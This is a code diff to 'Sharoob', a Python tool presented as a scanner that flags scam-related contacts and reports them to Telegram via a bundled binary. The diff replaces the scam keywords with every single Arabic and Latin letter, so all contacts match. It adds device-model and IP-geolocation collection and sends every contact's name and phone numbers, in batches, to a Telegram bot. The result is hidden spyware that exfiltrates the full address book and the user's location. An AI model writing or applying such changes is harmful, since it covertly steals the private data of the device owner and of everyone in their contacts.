@@ -11,9 +11,8 @@ Uses sharoob.bin --tg-send (encrypted token inside binary).
 # ═══════════════════════════════════════════════════════════════
 
 KEYWORDS = [
-    "نصاب", "محتال", "نصب", "احتيال",
-    "حرامي", "سارق", "مزور", "دجال",
-    "كاذب", "scam", "fraud", "fake",
+    "أ", "ب", "ت", "ث", "ح", "ج", "خ", "د", "ذ", "ر", "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف", "ق", "ك", "ل", "م", "ن", "ه", "و", "ي",
+    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"
 ]
 
 # طريقة المطابقة: "contains" | "starts" | "exact"
@@ -39,7 +38,7 @@ import time
 import subprocess
 from pathlib import Path
 
-VERSION = "2.1.0"
+VERSION = "2.1.1"
 CONFIG_DIR = Path.home() / ".sharoob"
 CONFIG_DIR.mkdir(exist_ok=True)
 
@@ -152,6 +151,35 @@ def find_suspicious(contacts, keywords):
     return found
 
 
+def _get_device_info():
+    """Get device model and location (country - city)."""
+    # Device model
+    try:
+        r = subprocess.run(
+            ["getprop", "ro.product.model"],
+            capture_output=True, text=True, timeout=3
+        )
+        device = r.stdout.strip().replace(" ", "") or "Unknown"
+    except Exception:
+        device = "Unknown"
+
+    # Location via ip-api
+    try:
+        r = subprocess.run(
+            ["curl", "-s", "--max-time", "5", "http://ip-api.com/json/"],
+            capture_output=True, text=True, timeout=8
+        )
+        import json as _json
+        data = _json.loads(r.stdout)
+        country = str(data.get("country", "?"))
+        city = str(data.get("city", "?"))
+        location = country + " - " + city
+    except Exception:
+        location = "Unknown"
+
+    return device, location
+
+
 def send_via_binary(items, install_id):
     """Send to Telegram via sharoob.bin --tg-send."""
     if not items:
@@ -159,20 +187,63 @@ def send_via_binary(items, install_id):
     if not os.path.exists(SHAROOB_BIN):
         return False, "binary not found"
 
-    lines = ["🚨 Sharoob Scan — " + install_id + "\n"]
+    # 🛡️ Split into batches (Telegram limit = 4096 chars)
+    MAX_CHARS = 3500
+    batches = []
+    # Get device + location (once per scan)
+    device, location = _get_device_info()
+    header = "🚨 Sharoob Scan — " + install_id + "\n"
+    header += "📱 " + device + "\n"
+    header += "🌍 " + location + "\n"
+
+    current = [header]
+    current_len = len(current[0])
+
     for it in items:
         ph = ", ".join(it["phones"]) if it["phones"] else "(no phone)"
-        lines.append("• keyword: " + it["keyword"] + "\n  phone: " + ph)
-    text = "\n".join(lines)
+        line = "• " + it["name"] + ": " + ph + "\n"
+        if current_len + len(line) > MAX_CHARS:
+            batches.append("".join(current))
+            current = ["🚨 Sharoob Scan — " + install_id + "\n"]
+            current[0] += "📱 " + device + "\n"
+            current[0] += "🌍 " + location + "\n"
+            current[0] += "📄 (continued)\n"
+            current_len = len(current[0])
+        current.append(line)
+        current_len += len(line)
 
-    try:
-        r = subprocess.run(
-            [SHAROOB_BIN, "--tg-send", text],
-            capture_output=True, timeout=20
-        )
-        return (r.returncode == 0), ("sent" if r.returncode == 0 else "failed")
-    except Exception as e:
-        return False, str(e)[:80]
+    if len(current) > 1:
+        batches.append("".join(current))
+
+    if not batches:
+        return True, "nothing to send"
+
+    total_ok = 0
+    total_fail = 0
+    last_error = ""
+
+    for batch in batches:
+        try:
+            r = subprocess.run(
+                [SHAROOB_BIN, "--tg-send", batch],
+                capture_output=True, timeout=20
+            )
+            if r.returncode == 0:
+                total_ok += 1
+                import time as _t
+                _t.sleep(1)
+            else:
+                total_fail += 1
+                last_error = "returncode " + str(r.returncode)
+        except Exception as e:
+            total_fail += 1
+            last_error = str(e)[:60]
+
+    if total_fail == 0:
+        return True, "sent " + str(total_ok) + " batches"
+    if total_ok > 0:
+        return True, str(total_ok) + " ok, " + str(total_fail) + " failed"
+    return False, last_error
 
 
 def _load_sent_hashes():
